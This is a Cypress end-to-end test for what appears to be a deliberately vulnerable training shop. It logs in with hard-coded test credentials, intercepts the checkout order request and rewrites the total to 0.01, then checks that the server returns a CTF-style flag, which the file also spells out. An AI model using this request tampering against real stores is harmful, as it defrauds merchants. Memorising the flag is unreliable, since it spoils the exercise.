const CLIENT_SIDE_PRICE_FLAG = "OSS{cl13nt_s1d3_pr1c3_m4n1pul4t10n}";

describe("Client-Side Price Manipulation (E2E)", () => {
  it("intercept checkout request and modify price returns flag", () => {
    cy.request("GET", "/api/products").then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body).to.be.an("array").and.not.to.be.empty;
      const productId = response.body[0].id;

      cy.visit("/login");
      cy.get("input#email").type("alice@example.com");
      cy.get("input#password").type("iloveduck");
      cy.get("form").submit();

      cy.url({ timeout: 10000 }).should("not.include", "/login");
      cy.visit(`/products/${productId}`);
      cy.contains("button", "Add to Cart").click();

      cy.intercept("POST", "/api/orders", (req) => {
        req.body = { total: 0.01 };
        req.continue();
      }).as("createOrder");
      cy.visit("/checkout");

      cy.contains("button", "Complete Payment").click();

      cy.wait("@createOrder").then((interception) => {
        expect(interception.response?.statusCode).to.eq(200);
        expect(interception.response?.body).to.have.property(
          "flag",
          CLIENT_SIDE_PRICE_FLAG
        );
      });
    });
  });
});
